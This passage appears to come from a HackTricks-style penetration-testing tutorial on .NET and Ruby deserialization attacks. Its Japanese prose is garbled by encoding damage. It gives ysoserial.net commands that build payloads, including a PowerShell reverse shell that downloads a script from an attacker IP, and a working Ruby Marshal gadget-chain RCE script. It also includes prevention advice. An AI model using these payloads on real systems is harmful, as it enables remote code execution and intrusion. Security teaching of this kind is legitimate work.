* **`--output`** ã¯ã€ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚’**raw**ã¾ãŸã¯**base64**ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã•ã‚ŒãŸå½¢å¼ã§æ¬²ã—ã„ã‹ã‚’æŒ‡ç¤ºã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚_**ysoserial.net**ã¯ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’**UTF-16LE**ï¼ˆWindowsã§ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ä½¿ç”¨ã•ã‚Œã‚‹ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°ï¼‰ã‚’ä½¿ç”¨ã—ã¦**ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰**ã™ã‚‹ã®ã§ã€rawã‚’å–å¾—ã—ã¦Linuxã‚³ãƒ³ã‚½ãƒ¼ãƒ«ã‹ã‚‰ãŸã ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã—ãŸå ´åˆã€ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆãŒé©åˆ‡ã«æ©Ÿèƒ½ã—ãªã„å¯èƒ½æ€§ãŒã‚ã‚‹**ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°ã®äº’æ›æ€§ã®å•é¡Œ**ãŒç™ºç”Ÿã™ã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ï¼ˆHTB JSONãƒœãƒƒã‚¯ã‚¹ã§ã¯UTF-16LEã¨ASCIIã®ä¸¡æ–¹ã§ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ãŒæ©Ÿèƒ½ã—ã¾ã—ãŸãŒã€ã“ã‚ŒãŒå¸¸ã«æ©Ÿèƒ½ã™ã‚‹ã¨ã¯é™ã‚Šã¾ã›ã‚“ï¼‰ã€‚_
* **`--plugin`** ysoserial.netã¯ViewStateã®ã‚ˆã†ãªç‰¹å®šã®ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯å‘ã‘ã®**ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚’ä½œæˆã™ã‚‹ãŸã‚ã®ãƒ—ãƒ©ã‚°ã‚¤ãƒ³**ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ã„ã¾ã™

#### ysoserial.netã®ãã®ä»–ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãƒ¼

* `--minify` ã¯å¯èƒ½ã§ã‚ã‚Œã°**ã‚ˆã‚Šå°ã•ãªãƒšã‚¤ãƒ­ãƒ¼ãƒ‰**ã‚’æä¾›ã—ã¾ã™
* `--raf -f Json.Net -c "anything"` ã“ã‚Œã«ã‚ˆã‚Šã€æä¾›ã•ã‚ŒãŸãƒ•ã‚©ãƒ¼ãƒãƒƒã‚¿ãƒ¼ï¼ˆã“ã®å ´åˆã¯`Json.Net`ï¼‰ã§ä½¿ç”¨ã§ãã‚‹ã™ã¹ã¦ã®ã‚¬ã‚¸ã‚§ãƒƒãƒˆãŒç¤ºã•ã‚Œã¾ã™
* `--sf xml` ã¯ã€ã‚¬ã‚¸ã‚§ãƒƒãƒˆï¼ˆ`-g`ï¼‰ã‚’**æŒ‡å®š**ã—ã€ysoserial.netã¯"xml"ï¼ˆå¤§æ–‡å­—å°æ–‡å­—ã‚’åŒºåˆ¥ã—ãªã„ï¼‰ã‚’å«ã‚€ãƒ•ã‚©ãƒ¼ãƒãƒƒã‚¿ãƒ¼ã‚’æ¤œç´¢ã—ã¾ã™

**ysoserialã®ä¾‹**ã§ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚’ä½œæˆã™ã‚‹ï¼š
```bash
#Send ping
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 10.10.14.44" -o base64

#Timing
#I tried using ping and timeout but there wasn't any difference in the response timing from the web server

#DNS/HTTP request
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a" -o base64

#Reverse shell
#Create shell command in linux
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')" | iconv  -t UTF-16LE | base64 -w0
#Create exploit using the created B64 shellcode
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=" -o base64
```
**ysoserial.net** ã«ã¯ã€å„ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆãŒã©ã®ã‚ˆã†ã«æ©Ÿèƒ½ã™ã‚‹ã‹ã‚’ã‚ˆã‚Šã‚ˆãç†è§£ã™ã‚‹ã®ã«å½¹ç«‹ã¤**éå¸¸ã«èˆˆå‘³æ·±ã„ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãƒ¼**ãŒã‚ã‚Šã¾ã™: `--test`\
ã“ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãƒ¼ã‚’æŒ‡å®šã™ã‚‹ã¨ã€**ysoserial.net** ã¯**ãƒ­ãƒ¼ã‚«ãƒ«ã§ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚’è©¦ã¿ã¾ã™**ã®ã§ã€ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ãŒæ­£ã—ãæ©Ÿèƒ½ã™ã‚‹ã‹ã©ã†ã‹ã‚’ãƒ†ã‚¹ãƒˆã§ãã¾ã™ã€‚\
ã“ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãƒ¼ã¯ä¾¿åˆ©ã§ã™ã€‚ãªãœãªã‚‰ã€ã‚³ãƒ¼ãƒ‰ã‚’è¦‹ã‚‹ã¨ä»¥ä¸‹ã®ã‚ˆã†ãªã‚³ãƒ¼ãƒ‰ã®å¡ŠãŒè¦‹ã¤ã‹ã‚‹ã‹ã‚‰ã§ã™ï¼ˆ[ObjectDataProviderGenerator.cs](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Generators/ObjectDataProviderGenerator.cs#L208)ã‹ã‚‰ã®ã‚‚ã®ï¼‰:
```java
if (inputArgs.Test)
{
try
{
SerializersHelper.JsonNet_deserialize(payload);
}
catch (Exception err)
{
Debugging.ShowErrors(inputArgs, err);
}
}
```
```markdown
ã“ã‚Œã¯ã€ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚’ãƒ†ã‚¹ãƒˆã™ã‚‹ãŸã‚ã«ã€ã‚³ãƒ¼ãƒ‰ãŒ[serializersHelper.JsonNet_deserialize](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Helpers/SerializersHelper.cs#L539)ã‚’å‘¼ã³å‡ºã™ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ã€‚
```
```java
public static object JsonNet_deserialize(string str)
{
Object obj = JsonConvert.DeserializeObject<Object>(str, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
return obj;
}
```
**å‰è¿°ã®ã‚³ãƒ¼ãƒ‰ã¯ä½œæˆã•ã‚ŒãŸã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã«å¯¾ã—ã¦è„†å¼±ã§ã™ã€‚**ã—ãŸãŒã£ã¦ã€.Netã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã§åŒæ§˜ã®ã‚‚ã®ã‚’è¦‹ã¤ã‘ãŸå ´åˆã€ãã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚‚ãŠãã‚‰ãè„†å¼±ã§ã‚ã‚‹ã¨ã„ã†ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ã€‚
ãã®ãŸã‚ã€**`--test`** ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãƒ¼ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€**ysoserial.net** ãŒä½œæˆã§ãã‚‹ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚¼ãƒ¼ã‚·ãƒ§ãƒ³ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã«å¯¾ã—ã¦**ã©ã®ã‚³ãƒ¼ãƒ‰ã®æ–­ç‰‡ãŒè„†å¼±ã§ã‚ã‚‹ã‹**ã‚’ç†è§£ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

### ViewState

[**.Netã®\_\_ViewStateãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãƒ¼ã‚’åˆ©ç”¨ã—ã¦ä»»æ„ã®ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹æ–¹æ³•ã«ã¤ã„ã¦ã®ã“ã®æŠ•ç¨¿**](exploiting-\_\_viewstate-parameter.md)ã‚’ã”è¦§ãã ã•ã„ã€‚ã‚‚ã—**æ—¢ã«è¢«å®³è€…ãƒã‚·ãƒ³ãŒä½¿ç”¨ã—ã¦ã„ã‚‹ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’çŸ¥ã£ã¦ã„ã‚‹å ´åˆ**ã¯ã€[**ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹æ–¹æ³•ã‚’çŸ¥ã‚‹ãŸã‚ã«ã“ã®æŠ•ç¨¿ã‚’èª­ã‚“ã§ãã ã•ã„**](exploiting-\_\_viewstate-knowing-the-secret.md)**ã€‚**

### **äºˆé˜²**

ãƒ‡ãƒ¼ã‚¿ã‚¹ãƒˆãƒªãƒ¼ãƒ ãŒã‚¹ãƒˆãƒªãƒ¼ãƒ ãŒãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã•ã‚Œã‚‹ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ã‚¿ã‚¤ãƒ—ã‚’å®šç¾©ã™ã‚‹ã“ã¨ã‚’è¨±å¯ã—ãªã„ã§ãã ã•ã„ã€‚ä¾‹ãˆã°ã€å¯èƒ½ã§ã‚ã‚Œã° `DataContractSerializer` ã‚„ `XmlSerializer` ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã“ã‚Œã‚’é˜²ãã“ã¨ãŒã§ãã¾ã™ã€‚

`JSON.Net` ã‚’ä½¿ç”¨ã™ã‚‹å ´åˆã¯ã€`TypeNameHandling` ãŒ `None` ã«è¨­å®šã•ã‚Œã¦ã„ã‚‹ã“ã¨ã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚
```
TypeNameHandling = TypeNameHandling.None
```
```markdown
`JavaScriptSerializer`ã‚’ä½¿ç”¨ã™ã‚‹å ´åˆã¯ã€`JavaScriptTypeResolver`ã¨ä¸€ç·’ã«ä½¿ç”¨ã—ãªã„ã§ãã ã•ã„ã€‚

ç‹¬è‡ªã®å‹ã‚’å®šç¾©ã™ã‚‹ãƒ‡ãƒ¼ã‚¿ã‚¹ãƒˆãƒªãƒ¼ãƒ ã‚’é€†ã‚·ãƒªã‚¢ãƒ«åŒ–ã™ã‚‹å¿…è¦ãŒã‚ã‚‹å ´åˆã¯ã€é€†ã‚·ãƒªã‚¢ãƒ«åŒ–ãŒè¨±å¯ã•ã‚Œã‚‹å‹ã‚’åˆ¶é™ã—ã¦ãã ã•ã„ã€‚å¤šãã®ãƒã‚¤ãƒ†ã‚£ãƒ–ãª.Netå‹ãŒãã‚Œè‡ªä½“ã§å±é™ºãªå¯èƒ½æ€§ãŒã‚ã‚‹ã“ã¨ã‚’èªè­˜ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ä¾‹ãˆã°ã€
```
```
System.IO.FileInfo
```
```markdown
ã‚µãƒ¼ãƒãƒ¼ä¸Šã«å®Ÿéš›ã«å­˜åœ¨ã™ã‚‹ãƒ•ã‚¡ã‚¤ãƒ«ã‚’å‚ç…§ã™ã‚‹`FileInfo`ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã¯ã€é€†ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã•ã‚Œã‚‹éš›ã«ã€ãã‚Œã‚‰ã®ãƒ•ã‚¡ã‚¤ãƒ«ã®ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã‚’å¤‰æ›´ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ï¼ˆä¾‹ãˆã°ã€èª­ã¿å–ã‚Šå°‚ç”¨ã«ã™ã‚‹ãªã©ï¼‰ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ã‚µãƒ¼ãƒ“ã‚¹æ‹’å¦æ”»æ’ƒã®æ½œåœ¨çš„ãªãƒªã‚¹ã‚¯ãŒç”Ÿã˜ã¾ã™ã€‚

é€†ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºå¯èƒ½ãªå‹ã‚’åˆ¶é™ã—ã¦ã„ã‚‹å ´åˆã§ã‚‚ã€ä¸€éƒ¨ã®å‹ã«ã¯ãƒªã‚¹ã‚­ãƒ¼ãªãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ãŒå­˜åœ¨ã™ã‚‹ã“ã¨ã‚’è¦šãˆã¦ãŠãå¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ä¾‹ãˆã°ã€`System.ComponentModel.DataAnnotations.ValidationException`ã¯`Value`ã¨ã„ã†`Object`å‹ã®ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã‚’æŒã£ã¦ã„ã¾ã™ã€‚ã“ã®å‹ãŒé€†ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã®ãŸã‚ã«è¨±å¯ã•ã‚Œã¦ã„ã‚‹å‹ã§ã‚ã‚Œã°ã€æ”»æ’ƒè€…ã¯`Value`ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã«ä»»æ„ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆå‹ã‚’è¨­å®šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

æ”»æ’ƒè€…ãŒã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹åŒ–ã•ã‚Œã‚‹å‹ã‚’æ“ä½œã™ã‚‹ã“ã¨ã‚’é˜²ãã¹ãã§ã™ã€‚ã“ã‚ŒãŒå¯èƒ½ã§ã‚ã‚Œã°ã€`DataContractSerializer`ã‚„`XmlSerializer`ã§ã•ãˆã‚‚æ‚ªç”¨ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ä¾‹ãˆã°ï¼š
```
```
// Action below is dangerous if the attacker can change the data in the database
var typename = GetTransactionTypeFromDatabase();

var serializer = new DataContractJsonSerializer(Type.GetType(typename));

var obj = serializer.ReadObject(ms);
```
```markdown
ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚¼ãƒ¼ã‚·ãƒ§ãƒ³ä¸­ã«ç‰¹å®šã®.Netã‚¿ã‚¤ãƒ—å†…ã§å®Ÿè¡ŒãŒç™ºç”Ÿã™ã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚ä»¥ä¸‹ã«ç¤ºã™ã‚ˆã†ãªã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ«ã‚’ä½œæˆã™ã‚‹ã“ã¨ã¯åŠ¹æœãŒã‚ã‚Šã¾ã›ã‚“ã€‚
```
```
var suspectObject = myBinaryFormatter.Deserialize(untrustedData);

//Check below is too late! Execution may have already occurred.
if (suspectObject is SomeDangerousObjectType)
{
//generate warnings and dispose of suspectObject
}
```
`BinaryFormatter`ã¨`JSON.Net`ã§ã¯ã€ã‚«ã‚¹ã‚¿ãƒ `SerializationBinder`ã‚’ä½¿ç”¨ã—ã¦ã€ã‚ˆã‚Šå®‰å…¨ãªãƒ›ãƒ¯ã‚¤ãƒˆãƒªã‚¹ãƒˆåˆ¶å¾¡ã‚’ä½œæˆã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚

æ—¢çŸ¥ã®.Netã®å®‰å…¨ã§ãªã„ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚¼ãƒ¼ã‚·ãƒ§ãƒ³ã‚¬ã‚¸ã‚§ãƒƒãƒˆã«ã¤ã„ã¦æœ€æ–°ã®æƒ…å ±ã‚’å¾—ã‚‹ã‚ˆã†ã«ã—ã€ãã®ã‚ˆã†ãªã‚¿ã‚¤ãƒ—ãŒãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚¼ãƒ¼ã‚·ãƒ§ãƒ³ãƒ—ãƒ­ã‚»ã‚¹ã«ã‚ˆã£ã¦ä½œæˆã•ã‚Œã‚‹å ´æ‰€ã«ç‰¹ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚**ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚¶ãƒ¼ã¯ã€çŸ¥ã£ã¦ã„ã‚‹ã‚¿ã‚¤ãƒ—ã®ã¿ã‚’ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹åŒ–ã§ãã¾ã™**ã€‚

ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆæ¥ç¶šã‚’æŒã¤ã‚³ãƒ¼ãƒ‰ã¨ã€æ½œåœ¨çš„ãªã‚¬ã‚¸ã‚§ãƒƒãƒˆã‚’ä½œæˆã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚‹ã‚³ãƒ¼ãƒ‰ã‚’åˆ†é›¢ã—ã¦ãã ã•ã„ã€‚ä¾‹ã¨ã—ã¦ã€WPFã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã§ä½¿ç”¨ã•ã‚Œã‚‹`System.Windows.Data.ObjectDataProvider`ã¯ã€ä»»æ„ã®ãƒ¡ã‚½ãƒƒãƒ‰å‘¼ã³å‡ºã—ã‚’å¯èƒ½ã«ã™ã‚‹æ—¢çŸ¥ã®ã‚¬ã‚¸ã‚§ãƒƒãƒˆã§ã™ã€‚ä¿¡é ¼ã§ããªã„ãƒ‡ãƒ¼ã‚¿ã‚’ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã™ã‚‹RESTã‚µãƒ¼ãƒ“ã‚¹ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã§ã“ã®ã‚¢ã‚»ãƒ³ãƒ–ãƒªã¸ã®å‚ç…§ã‚’æŒã¤ã“ã¨ã¯ãƒªã‚¹ã‚¯ãŒé«˜ã„ã§ã—ã‚‡ã†ã€‚

### **å‚è€ƒæ–‡çŒ®**

* Javaã¨.Netã®JSONãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚¼ãƒ¼ã‚·ãƒ§ãƒ³ã«é–¢ã™ã‚‹**è«–æ–‡:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** ãƒˆãƒ¼ã‚¯: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) ãŠã‚ˆã³ã‚¹ãƒ©ã‚¤ãƒ‰: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp)
* [https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf)
* [https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization](https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization)

## **Ruby**

Rubyã«ã¯**marshal**ãƒ©ã‚¤ãƒ–ãƒ©ãƒªå†…ã§ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚¼ãƒ¼ã‚·ãƒ§ãƒ³ã‚’å®Ÿè£…ã™ã‚‹ãŸã‚ã®2ã¤ã®æ–¹æ³•ãŒã‚ã‚Šã¾ã™ã€‚æœ€åˆã®æ–¹æ³•ã¯ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ãƒã‚¤ãƒˆã‚¹ãƒˆãƒªãƒ¼ãƒ ã«å¤‰æ›ã™ã‚‹**dump**ï¼ˆ**ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚º**ï¼‰ã€‚ãã—ã¦2ã¤ç›®ã®æ–¹æ³•ã¯ãƒã‚¤ãƒˆã‚¹ãƒˆãƒªãƒ¼ãƒ ã‚’å†ã³ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã«å¤‰æ›ã™ã‚‹**load**ï¼ˆ**ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚º**ï¼‰ã§ã™ã€‚\
Rubyã¯ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã•ã‚ŒãŸã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã«HMACã‚’ä½¿ç”¨ã—ã¦ç½²åã—ã€ä»¥ä¸‹ã®ãƒ•ã‚¡ã‚¤ãƒ«ã®ã„ãšã‚Œã‹ã«ã‚­ãƒ¼ã‚’ä¿å­˜ã—ã¾ã™ï¼š

* config/environment.rb
* config/initializers/secret\_token.rb
* config/secrets.yml
* /proc/self/environ

Ruby 2.Xã®ä¸€èˆ¬çš„ãªãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚¼ãƒ¼ã‚·ãƒ§ãƒ³ã‹ã‚‰RCEã‚¬ã‚¸ã‚§ãƒƒãƒˆãƒã‚§ãƒ¼ãƒ³ã¾ã§ï¼ˆè©³ç´°ã¯[https://www.elttam.com/blog/ruby-deserialization/](https://www.elttam.com/blog/ruby-deserialization/)ã‚’å‚ç…§ï¼‰ï¼š
```ruby
#!/usr/bin/env ruby

class Gem::StubSpecification
def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")#RCE cmd must start with "|" and end with "1>&2"

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
def marshal_dump
[$dependency_list]
end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
pipe.print payload
pipe.close_write
puts pipe.gets
puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```
```markdown
Ruby On Railsã‚’åˆ©ç”¨ã—ãŸä»–ã®RCEãƒã‚§ãƒ¼ãƒ³ã®æ‚ªç”¨: [https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/](https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/)

<details>

<summary><strong>AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricksã«ã‚ãªãŸã®ä¼šç¤¾ã‚’åºƒå‘Šã—ãŸã„**ã€ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã™ã‚‹ã€ç§ãŸã¡ã®ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã«**å‚åŠ ã™ã‚‹**ã‹ã€[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã™ã‚‹ã€‚
* [**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚³ãƒ„ã‚’**å…±æœ‰ã™ã‚‹**ã€‚

</details>
```
